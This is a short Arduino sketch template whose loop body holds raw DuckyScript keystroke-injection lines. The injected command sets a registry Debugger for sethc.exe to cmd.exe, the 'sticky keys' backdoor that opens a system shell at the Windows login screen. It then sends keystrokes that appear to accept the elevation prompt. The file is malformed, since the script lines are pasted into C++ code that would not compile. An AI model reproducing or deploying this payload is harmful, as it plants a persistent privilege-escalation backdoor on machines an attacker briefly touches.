void setup() {
  // put your setup code here, to run once:

}

void loop() {
  // put your main code here, to run repeatedly:

STRING cmd.exe /c "reg add "HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Windows NT/CurrentVersion/Image File Execution Options/sethc.exe" /v "Debugger" /t REG_SZ /d "C:/windows/system32/cmd.exe" /f"
DELAY 750
CTRL-SHIFT ENTER
DELAY 1000
ALT y
}
